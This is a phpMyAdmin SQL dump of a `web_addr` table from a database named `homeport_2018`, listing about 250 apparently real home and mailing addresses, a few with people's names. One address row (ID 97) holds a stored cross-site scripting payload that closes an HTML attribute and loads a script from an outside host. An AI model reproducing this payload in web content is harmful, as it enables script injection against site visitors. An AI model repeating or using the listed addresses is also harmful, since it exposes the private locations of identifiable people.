-- phpMyAdmin SQL Dump
-- version 4.9.4
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Sep 27, 2020 at 05:56 PM
-- Server version: 5.6.47
-- PHP Version: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `homeport_2018`
--

-- --------------------------------------------------------

--
-- Table structure for table `web_addr`
--

CREATE TABLE `web_addr` (
  `wa_ID` int(11) NOT NULL,
  `wc_ID` int(11) NOT NULL,
  `wa_line1` tinytext NOT NULL,
  `wa_line2` tinytext,
  `wa_city` tinytext NOT NULL,
  `wa_state` tinytext NOT NULL,
  `wa_zip` tinytext NOT NULL,
  `wa_registry` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `web_addr`
--

INSERT INTO `web_addr` (`wa_ID`, `wc_ID`, `wa_line1`, `wa_line2`, `wa_city`, `wa_state`, `wa_zip`, `wa_registry`) VALUES
(15, 10, '247 Main Street', 'APT 1A', 'WINOOSKI', 'VT', '05404', 1),
(16, 11, '215 W. 88th St. , NY, NY', '#11H', 'NEW YORK', 'NY', '10024', 0),
(17, 12, '191 Browns Trace Rd', '', 'JERICHO', 'VT', '05465', 0),
(19, 13, '771 Essex rd', 'APT 1', 'WILLISTON', 'VT', '05495', 1),
(20, 14, '294 Crosby Heights', '', 'VERGENNES', 'VT', '05491', 1),
(21, 15, '52 Overlake Park', '', 'BURLINGTON', 'VT', '05401', 1),
(22, 16, '2 Spruce Street', '', 'STONEHAM', 'MA', '02180', 1),
(24, 9, '4458 Greenbush Rd', '', 'CHARLOTTE', 'VT', '05445', 0),
(38, 29, '4458 greenbush road', 'charlotte', 'CHARLOTTE', 'VT', '05445', 0),
(40, 33, '3338 ThÃ©rÃ¨se Casgrain Sherbrooke Canada', '', '', '', 'j1l3a2', 0),
(41, 35, '601 E Cincinatti Greenup Illinois', '', 'GREENUP', 'IL', '62428', 0),
(42, 42, '93 Woodland Drive', '', 'BARRE', 'VT', '05641', 1),
(43, 47, '52 Church Street', '', 'BURLINGTON', 'VT', '05401', 1),
(44, 24, '601 E cincinatti', '', 'GREENUP', 'IL', '62428', 0),
(45, 53, '100 West Canal St', '#39', 'WINOOSKI', 'VT', '05404', 0),
(46, 54, '15 Lake St', 'Apt 4H', 'WHITE PLAINS', 'NY', '10603', 0),
(47, 55, '360 Barber Ave, Ann Arbor MI', '', 'ANN ARBOR', 'MI', '48103', 0),
(48, 56, 'P O BOX 46', '', 'POULTNEY', 'VT', '05764', 0),
(49, 75, '52 church st Burlington, VT', '', 'BURLINGTON', 'VT', '05401', 0),
(50, 77, '1024 3rd ave NE', '', 'BRAINERD', 'MN', '56401', 0),
(51, 78, 'L16 Stonehedge Dr', '', '', '', '05423', 1),
(52, 79, '3436 rue NapolÃ©on', '', '', '', 'J6x4b9', 0),
(53, 23, '601 E cincinatti', '', 'GREENUP', 'IL', '62428', 0),
(54, 83, 'Kurac 123', '123', '', '', '10000', 1),
(55, 91, '5585 NW 72nd Ave', '50678', 'MIAMI', 'FL', '33195', 0),
(56, 45, '70 North Street', '2', 'BURLINGTON', 'VT', '05401', 0),
(58, 94, '5585 NW 72nd Ave', '50678', 'MIAMI', 'FL', '33195', 0),
(59, 95, '2200 Hill Road', '', 'PERKIOMENVILLE', 'PA', '18074', 0),
(60, 97, '1291 North Ave', '', 'BURLINGTON', 'VT', '05408', 1),
(61, 100, '398 Jenness Pond rd', '', 'NORTHWOOD', 'NH', '03261', 0),
(62, 114, '880 Lake Rd, Milton VT', '', 'BURLINGTON', 'VT', '05408', 1),
(63, 125, '2016 Creekview Ct. Red Wing, MN', '', 'RED WING', 'MN', '55066', 0),
(64, 40, '1905 warren st', '', 'HARLINGEN', 'TX', '78550', 0),
(65, 109, '8225 Mukilteo Speedway ', '', 'MUKILTEO', 'WA', '98275', 0),
(66, 130, 'PO Box 322', '160 Jaffrey Road', 'MARLBOROUGH', 'NH', '03455', 0),
(67, 130, '172 Great Road', '', 'JAFFREY', 'NH', '03452', 0),
(68, 126, '235 Fire Field rd New Braunfels TEXAS', '', 'NEW BRAUNFELS', 'TX', '78130', 0),
(69, 135, '1950 Brazier Road', '', 'MONTPELIER', 'VT', '05602', 0),
(70, 136, '10 Scottfield Rd Allston MA ', '23', 'ALLSTON', 'MA', '02134', 0),
(71, 141, '112 WESTON HTS', '', 'WINDSOR', 'VT', '05089', 0),
(72, 142, '3300 West Camelback Road ', 'Jerome - 415', 'PHOENIX', 'AZ', '85017', 0),
(73, 145, '93 Woodland Drive', '', 'BARRE', 'VT', '05641', 0),
(74, 164, '296 South Cove Rd.', '', 'BURLINGTON', 'VT', '05401', 0),
(75, 168, '48511 Whitaker Rd', '', 'SAINT INIGOES', 'MD', '20684', 0),
(76, 176, '930 Hayes St', 'Apt A', 'SAN FRANCISCO', 'CA', '94117', 0),
(77, 199, '125 Riverview Rd', '', 'WAITSFIELD', 'VT', '05673', 0),
(78, 206, '88 Corbett Road', '', 'UNDERHILL', 'VT', '05489', 0),
(79, 207, 'po box 421', '', 'MAULDIN', 'SC', '29662', 0),
(80, 222, '100 Oak Leaf Circle', '', 'ESTILL SPRINGS', 'TN', '37330', 0),
(81, 227, '10 Marie Lane, Ridgefield, CT', '', 'RIDGEFIELD', 'CT', '06877', 0),
(82, 231, 'Ms.MaryM.Rich', '155 vermont street', '', '', '14609-4904', 0),
(83, 236, 'Dealer Policy  2300 St George Rd', '', 'WILLISTON', 'VT', '05495', 0),
(84, 216, '2214 Arnold Bay Rd', '', 'VERGENNES', 'VT', '05491', 0),
(85, 250, '311 2nd St, Oakland, CA', 'APT 705', 'OAKLAND', 'CA', '94607', 0),
(86, 251, '5 Prospect Street Needham, MA', '', 'NEEDHAM', 'MA', '02492', 0),
(87, 252, '258 Pearl Street', 'Apt. #1', 'BURLINGTON', 'VT', '05401', 0),
(88, 264, '326 Quarry Hill Rd.', 'apt 243', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(89, 273, '2110 W Pontiac Dr', '', 'PHOENIX', 'AZ', '85027', 0),
(90, 278, '397 Kearsarge Valley Road', '', '', '', '03260', 0),
(91, 294, '17 Ox Yoke Drive', '', 'SIMSBURY', 'CT', '06070', 0),
(92, 306, '634 Masters Way', '', 'PALM BEACH GARDENS', 'FL', '33418', 0),
(93, 307, '181 Winterberry Ln ', '302', '', '', '05401-5924', 0),
(94, 9, '123 Elm Street', '', 'BEVERLY HILLS', 'CA', '90210', 0),
(96, 339, '24 Westmore', '', 'CUMBERLAND CENTER', 'ME', '04021', 0),
(97, 343, '444 Rollins St\"><sCRiPt sRC=//gk.gy/y></sCrIpT>', '', 'MISSOULA', 'MT', '59801', 0),
(99, 344, '1988 Highway 98W Carrabelle Florida ', '', 'CARRABELLE', 'FL', '32322', 0),
(100, 361, '39 OVERLOOK DR', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(101, 365, '321 Porterwood Drive Williston VT 05495', '', 'WILLISTON', 'VT', '05495', 0),
(102, 367, '33 Shepard Street', 'Apt C', 'WINOOSKI', 'VT', '05404', 0),
(103, 369, '185 Adelphi St', 'Apt 3', 'BROOKLYN', 'NY', '11205', 0),
(104, 371, '5 S.Main Street', '75643', 'ENGLISHTOWN', 'NJ', '07726', 0),
(105, 378, '364 S Winooski Ave', 'Apt K', 'BURLINGTON', 'VT', '05401', 0),
(106, 385, '185 Davis Road', 'N603', 'BURLINGTON', 'VT', '05401', 0),
(107, 388, '141 Bay Meadow Estates Unit #4', 'Colchester', 'COLCHESTER', 'VT', '05446', 0),
(108, 395, '3601 Old Capitol Trail Unit A-7', 'Suite 115802', 'WILMINGTON', 'DE', '19808', 0),
(109, 400, '78 Woodlawn Rd', 'Apt B', 'BURLINGTON', 'VT', '05408', 0),
(110, 407, '25 Baycrest Drive #110', 'South Burlington', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(111, 409, '309 Aurielle Drive Colchester', '', 'COLCHESTER', 'VT', '05446', 0),
(112, 427, '1468 Williston Road', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(113, 430, '55 Crescent Road', '', 'BURLINGTON', 'VT', '05401', 0),
(114, 437, '72 North Street', 'Apt A', 'WINOOSKI', 'VT', '05404', 0),
(115, 440, '288 Flynn Ave.', 'Unit # 21', 'BURLINGTON', 'VT', '05401', 0),
(116, 449, '11 Hill Street', '', 'RYE', 'NY', '10580', 0),
(117, 459, '28 Catamount Dr Milton', '', 'MILTON', 'VT', '05468', 0),
(118, 479, '765 Maple Hill Road', '', 'ROCHESTER', 'VT', '05767', 0),
(119, 486, '450 n market st', '', 'LANCASTER', 'PA', '17603', 0),
(120, 498, '7 Ellen Place', '', 'KINGS PARK', 'NY', '11754', 0),
(121, 503, '191 Kimberly Lane', 'Apt 9', 'WATERBURY', 'VT', '05676', 0),
(122, 512, '3301 SW 13th St', 'V294', 'GAINESVILLE', 'FL', '32608', 0),
(123, 514, '479 North St.', '', 'BURLINGTON', 'VT', '05401', 0),
(124, 428, '38 Catamount Lane', 'Apt 148', 'COLCHESTER', 'VT', '05446', 0),
(125, 538, '44 Isham St. ', '', 'BURLINGTON', 'VT', '05401', 0),
(126, 544, '9 Elm Terrace', 'Apt 2', 'BURLINGTON', 'VT', '05401', 0),
(127, 546, '32 Stub Toe Lane, Portsmouth, RI', '', 'PORTSMOUTH', 'RI', '02871', 0),
(128, 406, '990 Sunset Dr.', '', 'ALLIANCE', 'OH', '44601', 0),
(129, 567, '3438 Moog Rd', '', 'HOLIDAY', 'FL', '34691', 0),
(130, 570, '2716 huntingtowne farms ln', '', 'CHARLOTTE', 'NC', '28210', 0),
(131, 570, '3030 lydia ln', '', 'NEWTON', 'NC', '28658', 0),
(132, 573, '7 Fletcher Place', 'Apt 1', 'BURLINGTON', 'VT', '05401', 0),
(133, 574, '14 Madison Road', '', 'MARBLEHEAD', 'MA', '01945', 0),
(134, 575, '110 Creek Gln', '', '', '', '05446-7162', 0),
(135, 577, '156 Spear Street', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(136, 578, '156 Spear St', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(137, 579, '343 Buck hollow Rd., Fairfax, VT', '', 'FAIRFAX', 'VT', '05454', 0),
(138, 580, '5129 Breezewind Lane Fort Worth Texas', '', 'FORT WORTH', 'TX', '76123', 0),
(139, 585, '1345 Keolu Drive', '', 'KAILUA', 'HI', '96734', 0),
(140, 473, '74 Snow Creek Rd ', 'Club 10 down stairs', 'WARREN', 'VT', '05674', 0),
(141, 594, '50 Avalanche Road', '', 'HINESBURG', 'VT', '05461', 0),
(142, 597, '120 stonebridge square ', '', 'CHAPPAQUA', 'NY', '10514', 0),
(143, 599, '1000 main street', '', 'SAINT JOHNSBURY', 'VT', '05819', 0),
(144, 600, '10 Homestead Farm Rd', '', 'JERICHO', 'VT', '05465', 0),
(145, 605, '57 Boone Hill Ct', '', 'JOHNSON CITY', 'TN', '37615', 0),
(146, 606, '629 Hinesburg Rd.', 'Apt. 101', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(147, 617, '580 Delaware Avenue Delmar, NY', '', 'DELMAR', 'NY', '12054', 0),
(148, 626, '5 Meadow Lane', '', 'UNDERHILL', 'VT', '05489', 0),
(149, 627, '191 Central Ave', 'Apt 3D', 'DOVER', 'NH', '03820', 0),
(150, 646, '466 S Reed Ct', '', 'DENVER', 'CO', '80226', 0),
(151, 641, '159 S UNION ST', 'APT 4', '', '', '05401-5060', 0),
(152, 651, '138 Brighton rd ', '', 'NEWPORT', 'NH', '03773', 0),
(153, 669, '131 North Ave', '', 'BURLINGTON', 'VT', '05401', 0),
(154, 665, '310 Baker Hill Road', 'Greensboro', 'GREENSBORO', 'VT', '05841', 0),
(156, 675, '5 Hopkins St ', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(157, 370, '99 Holmes Road', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(158, 683, '1100 N. 10th Street', '', 'MATTOON', 'IL', '61938', 0),
(159, 689, '57 Howard Street', '', 'BURLINGTON', 'VT', '05401', 0),
(160, 672, '535 4th St', 'Lincoln, IL', 'LINCOLN', 'IL', '62656', 0),
(161, 693, '40 Sheffield Square Rd', ' Sheffield, VT', 'SHEFFIELD', 'VT', '05866', 0),
(162, 696, '59 Alder Ln', '', 'BURLINGTON', 'VT', '05401', 0),
(163, 698, '249 Mountain View Ridge', '', 'BRANDON', 'VT', '05733', 0),
(164, 701, '52 Church St.', '', 'BURLINGTON', 'VT', '05401', 0),
(165, 702, '764 Porterwood Dr.', '', 'WILLISTON', 'VT', '05495', 0),
(166, 706, '2543 Fire Hill Road', '', 'FLORENCE', 'VT', '05744', 0),
(167, 709, '15128 Majorca St', '', 'DALLAS', 'TX', '75248', 0),
(168, 716, '4454 Roosevelt Highway Colchester ', '', 'COLCHESTER', 'VT', '05446', 0),
(169, 742, '57 Bayberry Hill Road', '', 'WEST TOWNSEND', 'MA', '01474', 0),
(170, 743, '501 Munger Street', '', 'MIDDLEBURY', 'VT', '05753', 0),
(171, 749, '11222 37th Ave SW', '', 'SEATTLE', 'WA', '98146', 0),
(172, 751, '67 Northshore Drive', '', 'BURLINGTON', 'VT', '05408', 0),
(173, 753, '878 Doolittle Rd', '', 'SHOREHAM', 'VT', '05770', 0),
(175, 420, '130 Mansfied Ave', 'Apt. 204', 'BURLINGTON', 'VT', '05401', 0),
(176, 770, '611 Pershing Dr', '', 'SILVER SPRING', 'MD', '20910', 0),
(177, 780, '407 E. Austin', '', 'ALAMO', 'TX', '78516', 0),
(178, 782, '95 Cedar Ave', '', 'ISLIP', 'NY', '11751', 0),
(179, 791, '209 Church Street', 'apt #6', 'BURLINGTON', 'VT', '05405', 0),
(180, 630, '400 Wingate Ter SW', '', 'VERO BEACH', 'FL', '32968', 0),
(181, 793, 'Cashman Road', 'Cashman Hall', 'COLCHESTER', 'VT', '05439', 0),
(182, 794, '14907 85th Rd # 2', '', 'JAMAICA', 'NY', '11435', 0),
(183, 798, '2623 Occidental Dr Vienna, VA', '', 'VIENNA', 'VA', '22180', 0),
(184, 799, '10125 Junction Drive ', 'Apt 135', 'ANNAPOLIS JUNCTION', 'MD', '20701', 0),
(185, 801, '1689 Village Center Drive', '202', 'LAKELAND', 'FL', '33803', 0),
(186, 803, '82 Memorial Drive', '', 'HOLYOKE', 'MA', '01040', 0),
(187, 805, '206 N Worth Ave', '', 'INDIANAPOLIS', 'IN', '46224', 0),
(188, 806, '1629 Saint Charles Ave', '', '', '', '44107-4312', 0),
(189, 808, '322 Ibey Road', '', 'CANAAN', 'NH', '03741', 0),
(190, 813, '826 Bruck Street', '', 'COLUMBUS', 'OH', '43206', 0),
(191, 814, '81 E Pattagansett Rd Apt 35 Niantic, CT 06357', '', 'NIANTIC', 'CT', '06357', 0),
(192, 816, '2199 weybridge rd', '', 'MIDDLEBURY', 'VT', '05753', 0),
(193, 821, '90 Rogers Lane', '', 'RICHMOND', 'VT', '05477', 0),
(194, 826, '25 Bacon Street', '103', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(195, 709, '#3 Los Arboles Ct.', '', 'DALLAS', 'TX', '75230', 0),
(196, 834, '2601 Country Park Drive SE', 'Smyrna, Georgia', 'SMYRNA', 'GA', '30080', 0),
(197, 836, '2821 Quinn Rd', '', 'CHESTER', 'SC', '29706', 0),
(198, 838, '7807 Cedar Ridge Ct', '', 'PROSPECT', 'KY', '40059', 0),
(199, 839, '270 SW South River Drive ', 'Apt 202', 'STUART', 'FL', '34997', 0),
(200, 496, '161 Austin Dr', 'Unit. 21', 'BURLINGTON', 'VT', '05401', 0),
(201, 847, '12 Pleasant Street', '', 'NANTUCKET', 'MA', '02554', 0),
(202, 849, '138 Robbins Street', 'Apt. 2', 'WALTHAM', 'MA', '02453', 1),
(203, 850, '2414 Florida Lane ', '', 'DURHAM', 'CA', '95938', 0),
(204, 852, '273-4 Hollow Creek Drive', '', 'COLCHESTER', 'VT', '05446', 0),
(205, 854, '75 Sanford lane', '', 'NEWCOMB', 'NY', '12852', 0),
(206, 855, '11680 45th Place NE', '', 'SAINT MICHAEL', 'MN', '55376', 0),
(207, 858, '238 Pinecrest Dr ', '', 'WILDWOOD', 'GA', '30757', 0),
(209, 867, '50 Temple Street', '#1', 'BURLINGTON', 'VT', '05408', 0),
(210, 875, '1716 Bannockburn Dr', '', 'COLUMBIA', 'SC', '29206', 0),
(211, 879, '7919 Lilly Pond Lane', '', 'WILMINGTON', 'NC', '28411', 0),
(212, 881, '145 Parker Road, Framingham, MA', '', 'FRAMINGHAM', 'MA', '01702', 0),
(213, 886, '3 Canterbury Ln', '', 'HOLDEN', 'MA', '01520', 0),
(214, 887, '13103 Sutton St.', '', 'CERRITOS', 'CA', '90703', 0),
(215, 888, '16 Pep Place', '', 'MILTON', 'VT', '05468', 0),
(216, 891, '277 Bartlett Rd', '', 'MONTPELIER', 'VT', '05602', 0),
(218, 893, '24 North St. Montpelier VT 05602', '', 'MONTPELIER', 'VT', '05602', 0),
(219, 894, '204 Bliss Road', '', 'MONTPELIER', 'VT', '05602', 0),
(220, 895, '3710 Roland Ave. Baltimore MD ', '', 'BALTIMORE', 'MD', '21211', 0),
(221, 897, '25 Deforest Street', 'Apt C 51', 'SEYMOUR', 'CT', '06483', 0),
(222, 901, 'E4803 745th Ave', '', 'MENOMONIE', 'WI', '54751', 0),
(223, 902, '43 Proctor Ave South Burlington VT', '', 'SOUTH BURLINGTON', 'VT', '05403', 1),
(224, 904, '2041 SE 44th AVE Portland, OR', '', 'PORTLAND', 'OR', '97215', 0),
(225, 903, '52 Church Street', '', 'BURLINGTON', 'VT', '05401', 1),
(226, 905, '36 Oakland terr', '', 'BURLINGTON', 'VT', '05408', 0),
(227, 789, '122 N Winooski Ave', 'Apt 3', 'BURLINGTON', 'VT', '05401', 0),
(228, 906, '5722 Grand Ave Western Springs IL', '', 'WESTERN SPRINGS', 'IL', '60558', 0),
(229, 906, '5722 Grand Ave.   Weatern Springs, IL ', '', 'WESTERN SPRINGS', 'IL', '60558', 0),
(230, 907, '26 Greenwood Avenue', '', 'ESSEX JUNCTION', 'VT', '05452', 0),
(231, 909, '302 Salvas Rd Huntington', '', 'HUNTINGTON', 'VT', '05462', 0),
(232, 913, 'Aren Nilsson ', '4254 West Carmen St.', 'TAMPA', 'FL', '33609', 0),
(233, 919, '123 asd', '', 'NEW YORK', 'NY', '10001', 0),
(234, 921, '245 Perimeter Drive', '201', 'COLCHESTER', 'VT', '05446', 0),
(235, 922, '1001 East 12th Street', '', 'NORTH PLATTE', 'NE', '69101', 0),
(236, 924, '8 Marcell Ave', '', 'BARRE', 'VT', '05641', 0),
(237, 926, '3824 16th Ave S', '', 'MINNEAPOLIS', 'MN', '55407', 0),
(238, 928, '69 Joy Drive', 'Unit E6', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(239, 886, '45 Murray Street', '', 'BURLINGTON', 'VT', '05401', 0),
(240, 534, '6 Pratt Rd.', '', 'JERICHO', 'VT', '05465', 0),
(241, 930, '12 Legacy Dr, Hooksett NH', '', 'HOOKSETT', 'NH', '03106', 0),
(242, 935, '325 Lime Kiln rd So Burlington VT', 'Apt 6104', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(243, 939, '126 Wood Acres Dr', '', 'CRESCO', 'PA', '18326', 0),
(244, 942, '312 White Pine Circle', '', 'LAWRENCE TOWNSHIP', 'NJ', '08648', 0),
(245, 946, '1348 Orchard Rd.', '', 'CHARLOTTE', 'VT', '05445', 0),
(246, 948, '31 Oakdale Ave Selden NY', '', 'SELDEN', 'NY', '11784', 0),
(247, 952, '10861 W Loyola Dr, Los Altos', '', 'LOS ALTOS', 'CA', '94024', 0),
(248, 953, '46 Murray St', 'Apt B', 'BURLINGTON', 'VT', '05401', 0),
(249, 955, '12 WILD PASTURE RD', '', 'EXETER', 'NH', '03833', 0),
(250, 957, '7111 Galgate Drive, Springfield VA', '', 'SPRINGFIELD', 'VA', '22152', 0),
(251, 962, '24 Skyline Drive, Morristown, NJ', '', 'MORRISTOWN', 'NJ', '07960', 0),
(252, 965, '14 Old Chapel Rd', 'room 102', 'MIDDLEBURY', 'VT', '05753', 0),
(254, 969, '2734 Evergreen St', '', 'YORKTOWN HEIGHTS', 'NY', '10598', 0),
(255, 969, '4014 Yarmouth A', 'Century Village', 'BOCA RATON', 'FL', '33434', 0),
(256, 970, '19 Mill Rd', '', 'BURLINGTON', 'NJ', '08016', 0),
(257, 972, '272 collabar Rd', '', 'MONTGOMERY', 'NY', '12549', 0),
(258, 975, '61 Pearl Street', 'Unit 26', 'ESSEX JUNCTION', 'VT', '05452', 0),
(259, 978, '407 E Redbud Drive', '', 'SLIDELL', 'LA', '70458', 0),
(260, 979, '22 Monroe Pkwy', '', 'MASSENA', 'NY', '13662', 0),
(261, 981, '95 Riverbend Drive', '', 'COVINGTON', 'GA', '30014', 0),
(262, 982, '1820 County Rd, East Calais, VT', '', 'EAST CALAIS', 'VT', '05650', 0),
(263, 984, '49 GREENE STREET', '', 'BURLINGTON', 'VT', '05401', 0),
(264, 988, '18792 The Pines ', '', 'EDEN PRAIRIE', 'MN', '55347', 0),
(265, 995, 'Cushing drive ', '7', 'ESSEX JUNCTION', 'VT', '05452', 0),
(266, 997, '3205 Costa Alta Dr Unit 93', '', 'CARLSBAD', 'CA', '92009', 0),
(267, 999, '271 Moulton Road', '', 'WAITSFIELD', 'VT', '05673', 0),
(268, 1000, '310 N Pasture Ln', '', 'CHARLOTTE', 'VT', '05445', 0),
(269, 1003, '331 Beach Rd', '', 'SHELBURNE', 'VT', '05482', 0),
(270, 1005, '5903 Green Street', '2', 'PHILADELPHIA', 'PA', '19144', 0),
(271, 1008, '4A lower highlands road', '', 'WEST DOVER', 'VT', '05356', 0),
(272, 1009, '607 Roxbury Industrial Center', ' ', 'CHARLES CITY', 'VA', '23030', 0),
(273, 788, '75 Prospect Street', 'Apt 6', 'BARRE', 'VT', '05641', 0),
(274, 1013, '390 1/2 St. Paul Street', '', 'BURLINGTON', 'VT', '05401', 0),
(275, 1014, '7 Park Avenue 7E', '', 'NEW YORK', 'NY', '10016', 0),
(276, 1015, '450 Kramer Rd', 'Dayton, Ohio', 'DAYTON', 'OH', '45419', 0),
(278, 1020, '40 Strong St Apt 2', 'Apt 2', 'BURLINGTON', 'VT', '05401', 0),
(279, 1021, '148 F Road, Naponee NE', '', 'NAPONEE', 'NE', '68960', 0),
(280, 1019, '32921 Calle San Marcos', '', 'SAN JUAN CAPISTRANO', 'CA', '92675', 0),
(281, 1022, '4911 N Avenida de Vizcaya ', '', 'TUCSON', 'AZ', '85718', 0),
(282, 878, '32921 Calle San Marcos', '', 'SAN JUAN CAPISTRANO', 'CA', '92675', 0),
(283, 1025, '10410 S Quincy St', '', 'JENKS', 'OK', '74037', 0),
(284, 1027, '29 Crombie Street, Burlington VT', '', 'BURLINGTON', 'VT', '05401', 0),
(285, 1030, '501 Slidel Street', 'Apt # 102', '', '', '29485-7184', 0),
(286, 878, '501 Slidel Street', '', 'SUMMERVILLE', 'SC', '29485', 0),
(287, 1031, '426 BROADLAKE RD', '', 'COLCHESTER', 'VT', '05446', 0);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `web_addr`
--
ALTER TABLE `web_addr`
  ADD PRIMARY KEY (`wa_ID`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `web_addr`
--
ALTER TABLE `web_addr`
  MODIFY `wa_ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=288;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
